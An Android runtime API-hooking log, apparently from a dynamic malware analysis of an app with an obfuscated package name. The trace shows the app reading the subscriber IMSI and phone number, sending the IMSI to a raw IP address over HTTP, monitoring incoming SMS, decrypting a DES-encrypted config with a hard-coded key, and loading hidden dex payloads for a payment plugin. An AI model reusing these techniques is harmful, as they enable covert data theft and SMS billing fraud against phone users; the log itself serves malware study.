D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb2host]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb3device]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.net.HttpURLConnection]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.okhttp.internal.http.HttpURLConnectionImpl]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.net.Socket]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.TelephonyManager]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.Debug]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.hardware.SensorManager]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602):  [Method][getString] [String][DC_ETAG] [Return][]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.PhoneFactory]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.MSimTelephonyManager]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.PhoneConstants]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.content.res.ResourcesKey]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.app.ResourcesManager]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/app/com.wemwcn.ojfhgllv-1/base.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/cache]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/cache]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.MSimTelephonyManager]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3791): [SDK] [android.app.ApplicationPackageManager] [getApplicationInfo] [FindApplicationName][String] [com.wemwcn.ojfhgllv]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/sdcard1]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb2host]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb3device]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb3host]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageState] [ExternalStorageState][String] [mounted]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602):  [Method][getString] [String][DC_APP_VERSIONCODE] [Return][]
D/S4URC   ( 3602):  [Method][getString] [String][DC_APP_VERSIONNAME] [Return][]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [com.wemwcn.ojfhgllv]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [canRead] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][putString] [Key][appCode] [Value][20104806]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][commit]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][putString] [Key][packCode] [Value][34112:465]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][commit]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][putBoolean] [Key][isInitialize] [Value][false]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml] [DesFile][/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.MSimTelephonyManager]
D/S4URC   ( 3602): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [com.wemwcn.ojfhgllv]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml.bak]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][commit]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][wyzf_config20104806.xml] [MODE][MODE_PRIVATE] [Method][putBoolean] [Key][hasCallAPPInit] [Value][true]
D/S4URC   ( 3791): [SDK] [android.app.ApplicationPackageManager] [getApplicationInfo] [FindApplicationName][String] [com.wemwcn.ojfhgllv]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/wyzf_config20104806.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [dalvik.system.DexClassLoader]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.org.conscrypt.KeyManagerFactoryImpl]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageState] [ExternalStorageState][String] [mounted]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.org.conscrypt.OpenSSLMessageDigestJDK$MD5]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zplugin_query.xml] [MODE][APPEND or MULTI_PROCESS] [Method][getIong] [Iong][QueryDataReciveTime] [Return][1528968571964]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/sdcard0/Android/data/3949BA59/10ADC.94]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/storage/sdcard0/Android/data/3949BA59/10ADC.94]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.internal.telephony.Phone]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3602): [SDK] [android.content.ContentResolver] [registerContentObserver] [URL][String] [content://sms/]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.provider.Telephony.SMS_RECEIVED,
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.net.conn.CONNECTIVITY_CHANGE,
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pz_sharedpre_cmreaderlogininfo.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pz_sharedpre_cmreaderlogininfo.xml.bak]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/pz_sharedpre_cmreaderlogininfo.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][pz_sharedpre_cmreaderlogininfo.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [java.net] [HttpURLConnection] [URL][String] [http://139.129.132.111:8001/GetMobile/MatchingMobile.aspx?IMSI=452050246825819&IMEI=null&TimeStamp=1528968573791&ChannelId=88&Sign=5977a6bc82bb1963a9a6523e22227eb4]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.provider.Telephony.SMS_RECEIVED,
D/S4URC   ( 3791): [SDK] [android.telephony.TelephonyManager] [getLine1Number]
D/S4URC   ( 3791): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [com.wemwcn.ojfhgllv]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][android.provider.Telephony.SMS_RECEIVED,
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/sp_name_configcom.wyzf.plugin.d.h.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [javax.crypto.spec.SecretKeySpec][Constructor] [KEY][gvTyY9Pf][type][DES][javax.crypto.Cipher][getInstance] [Cipher][DES] [javax.crypto.Cipher][getInstance] [Cipher][DES] [javax.crypto.Cipher][doFinal] [Data][yatejs/oIjicMyVKZnGRL7dqqXZd7PLMdsGYSU6EdrQJsXkZN4QyyDb7V6ljUpCpf9EpV6Vm9O1X5dI+nJaaFQisVpGHXzUea9Ws8BDqRbE=] [Return][{"chnid":"","psmm":"1","sfst":0,"spcd":0,"status":4004,"subthd":0,"yso":1}]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getParent] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [isFile] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [getName] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.dex]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.dex]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/meminfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getParent] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/mj.dex]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/storage/usb3host]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][cp] [Return][1000100020001204]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][qd] [Return][zyap3030_58470_100]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/storage/sdcard0/Android/data/com.door.pay.app/uu.dat]
D/S4URC   ( 3602): [SDK] [java.io.File] [createNewFile] [FilePath][String] [/storage/sdcard0/Android/data/com.door.pay.app/uu.dat]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][cp] [Return][1000100020001204]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][qd] [Return][zyap3030_58470_100]
D/S4URC   ( 3602): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.SystemProperties]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zpay_info.xml]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][getString] [String][appId] [Return][3030]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0/Android/data/com.door.pay.app/uu.dat]
D/S4URC   ( 3602): [SDK] [java.lang.ProcessBuilder] [Constructor] [Command][String] [,/system/bin/cat,/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq]
D/S4URC   ( 3791): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [com.google.android.webview]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zplugin_query.xml] [MODE][APPEND or MULTI_PROCESS] [Method][putLong] [Key][QueryDataReciveTime] [Value][1528968573922]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [renameTo] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml] [DesFile][/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml.bak]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/md.tmp]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/md.tmp]
D/S4URC   ( 3602): [SDK] [java.io.File] [createNewFile] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/md.tmp]
D/S4URC   ( 3791): [SDK] [android.app.ApplicationPackageManager] [getPackageInfo] [FindPackageName][String] [com.android.webview]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.android.webview]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [delete] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml.bak]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zplugin_query.xml] [MODE][APPEND or MULTI_PROCESS] [Method][commit]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zplugin_query.xml] [MODE][APPEND or MULTI_PROCESS] [Method][putLong] [Key][NextReqInterval] [Value][86400]
D/S4URC   ( 3791): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/zplugin_query.xml]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3791): [SDK] [android.content.ContextWrapper] [registerReceiver][IntentFilter][download_action_10ADC.94.new.data,
D/S4URC   ( 3791): [SDK] [dalvik.system.BaseDexClassLoader] [Constructor] [DexPath][String] [/system/app/webview/webview.apk] [NDKPath][String] [/system/app/webview/lib/arm]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [getName] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [isDirectory] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [isFile] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [getPath] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [dalvik.system.DexFile] [openDexFile] [DexPath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/app/webview/webview.apk]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/proc/cpuinfo]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/yt.tmp]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/files/yt.tmp]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/app/webview/lib/arm]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/vendor/lib]
D/S4URC   ( 3791): [SDK] [java.io.File] [Constructor] [FilePath][String] [/system/lib]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.app.Activity]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.content.Intent]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.Environment]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.content.ContentResolver]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.Process]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.hardware.Camera]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.accounts.AccountManager]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.location.Location]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.webkit.WebView]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.media.MediaRecorder]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.content.Intent]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [dalvik.system.BaseDexClassLoader]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [dalvik.system.DexFile]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [dalvik.system.DexClassLoader]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.app.ApplicationPackageManager]
D/S4URC   ( 3602): [SDK] [java.io.File] [Constructor] [FilePath][String] [/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.app.ActivityManager]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.app.ActivityManager]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.lang.Runtime]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.lang.Class]
D/S4URC   ( 3602): [SDK] [android.telephony.TelephonyManager] [getSubscriberId]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.net.HttpURLConnection]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [com.android.okhttp.internal.http.HttpURLConnectionImpl]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [java.net.Socket]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.telephony.TelephonyManager]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.os.Debug]
D/S4URC   ( 3791): [SDK] [java.lang.Class] [forName] [FindClass][String] [android.hardware.SensorManager]
D/S4URC   ( 3602): [SDK] [java.lang.ProcessBuilder] [Constructor] [Command][String] [,/system/bin/cat,/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.os.Environment] [getExternalStorageDirectory] [DirectoryPath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [java.io.File] [getPath] [FilePath][String] [/storage/sdcard0]
D/S4URC   ( 3602): [SDK] [android.content.ContextWrapper][getSharedPreferences] [File][zpay_info.xml] [MODE][MODE_PRIVATE] [Method][putString] [Key][DC_ETAG] [Value][F009D9FAD388CBD5D3BD4244C204B456]
D/S4URC   ( 3602): [SDK] [java.io.File] [exists] [FilePath][String] [/data/data/com.wemwcn.ojfhgllv/shared_prefs/dc.053CE9326103161DC37854ECE8E0DBE2.preferences.xml]
